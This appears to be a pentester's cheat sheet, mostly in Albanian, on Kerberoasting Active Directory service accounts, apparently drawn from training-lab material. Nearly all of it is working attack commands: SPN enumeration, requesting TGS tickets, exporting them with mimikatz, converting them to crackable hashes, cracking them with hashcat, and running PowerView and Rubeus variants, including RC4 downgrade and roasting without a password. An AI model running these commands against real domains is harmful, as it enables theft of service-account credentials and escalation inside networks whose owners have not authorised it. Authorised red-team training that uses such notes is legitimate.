
## 🎯 Çfarë është Kerberoasting?

👉 Sulm kundër **service accounts në Active Directory**

✔️ Lejon:
- marrjen e **TGS tickets**
- dhe **crack offline të password-it**

```powershell
# Tregon të gjitha SPN-të në domain
setspn.exe -Q */*

# Kerkon nje Kerberos TGS Ticket (Powershell)
Add-Type -AssemblyName System.IdentityModel
New-Object System.IdentityModel.Tokens.KerberosRequestorSecurityToken -ArgumentList "MSSQLSvc/DEV-PRE-SQL.inlanefreight.local:1433"

# Ben kerkes TGs per te gjitha SPN ne domain duke gjetur ticket dhe duke i ruajtur ne cache 
setspn.exe -T INLANEFREIGHT.LOCAL -Q */* | Select-String '^CN' -Context 0,1 | % { New-Object System.IdentityModel.Tokens.KerberosRequestorSecurityToken -ArgumentList $_.Context.PostContext[0].Trim() }

# Nxjerrja e biletave nga memorja me mimikatz
mimikatz
base64 /out:true
kerberos::list /export 
```

Konvertimi i biletave për hash cracking
```powershell
# Pergatisim bileten per ta thyer duke hequr hapsirat dhe e kthyer ne one line
echo "<base64 blob>" |  tr -d \\\\n 

# Dekodim i file-it të enkriptuar dhe e kthejm en formatin .kirbi
cat encoded_file | base64 -d > sqldev.kirbi

# Konvertim në format për John, nxjerrim Kerberoas nga TGS
python2.7 kirbi2john.py sqldev.kirbi > crack_file

# Konvertim në format për Hashcat
sed 's/\\$krb5tgs\\$\\(.*\\):\\(.*\\)/\\$krb5tgs\\$23\\$\\*\\1\\*\\$\\2/' crack_file > sqldev_tgs_hashcat
```

Cracking me Hashcat
```powershell
# Për RC4 (etype 23)
hashcat -m 13100 sqldev_tgs_hashcat /usr/share/wordlists/rockyou.txt

# Për AES (etype 17/18)
hashcat -m 19700 aes_to_crack /usr/share/wordlists/rockyou.txt
```

Kerberoasting me PowerView
```powershell
# Importo PowerView
Import-Module .\\PowerView.ps1

# Gjej user-at që kanë SPN
Get-DomainUser * -SPN | select samaccountname

# Nxirr hash për një user specifik (për hashcat)
Get-DomainUser -Identity sqldev | Get-DomainSPNTicket -Format Hashcat

# Eksporto të gjitha ticket në CSV
Get-DomainUser * -SPN | Get-DomainSPNTicket -Format Hashcat | Export-Csv .\\ilfreight_tgs.csv -NoTypeInformation
cat .\\ilfreight_tgs.csv

# Shfaq SPN dhe tipet e enkriptimit për përdoruesin
Get-DomainUser testspn -Properties samaccountname,serviceprincipalname,msds-supportedencryptiontypes

```

### **Using Rubeus**
```powershell
# Trg permbledhje te biletave qe ndodhen ne sistem
.\\Rubeus.exe kerberoast /stats

# Merr vetëm ticket për user-at me privilegje admin (adminCount=1)
.\\Rubeus.exe kerberoast /ldapfilter:'admincount=1' /nowrap

# Merr ticket vetëm për përdoruesin testspn
.\\Rubeus.exe kerberoast /user:testspn /nowrap

# Flamuri /tgtdeleg qe do filtroj vetem ticket qe kan RC4 qe mund te thyen me shpejte.
.\\Rubeus.exe kerberoast /tgtdeleg /user:testspn /nowrap
```


---
## Manual Detection

```bash
# LDAP filter to search for users exposing a service
&(objectCategory=person)(objectClass=user)(servicePrincipalName=*)

# Using FindSPNAccounts.ps1 script
.\FindSPNAccounts.ps1
```

A small PowerShell script allows us to automate finding these accounts in an environment:
```powershell
$search = New-Object DirectoryServices.DirectorySearcher([ADSI]"") 
$search.filter = "(&(objectCategory=person)(objectClass=user)(servicePrincipalName=*))" 
$results = $search.Findall() 
foreach($result in $results) 
{ 
	$userEntry = $result.GetDirectoryEntry() 
	Write-host "User" 
	Write-Host "====" 
	Write-Host $userEntry.name "(" $userEntry.distinguishedName ")" 
		Write-host "" 
	Write-host "SPNs" 
	Write-Host "====" 
	foreach($SPN in $userEntry.servicePrincipalName) 
	{ 
		$SPN 
	} 
	Write-host "" 
	Write-host "" }

```


## Automated Tools

```bash
# Using FindSPNAccounts.ps1 script
.\FindSPNAccounts.ps1

# Enumerate SPN with PowerView
Import-Module .\PowerView.ps1
Get-DomainUser -SPN

# Kerberoasting with PowerView
Import-Module .\PowerView.ps1
Get-DomainUser * -SPN | Get-DomainSPNTicket -format Hashcat | export-csv .\tgs.csv -notypeinformation
cat .\tgs.csv 

# Invoke-Kerberoast (fast methode)
Import-Module .\PowerView.ps1
Invoke-Kerberoast

# Kerberoasting with Rubeus
Rubeus.exe kerberoast /nowrap

# setspn
setspn-T <domain>-Q */*

# Hash Cracking
hashcat.exe -m 13100 C:\Tools\kerb.txt C:\Tools\rockyou.txt -O
```

## Kerberoasting without an Account Password
```bash
# Execute Rubeus createnetonly
Rubeus.exe createnetonly /program:cmd.exe /show

# Performing the Attack with /nopreauth
Rubeus.exe kerberoast /nopreauth:amber.smith /domain:inlanefreight.local /spn:MSSQLSvc/SQL01:1433 /nowrap
```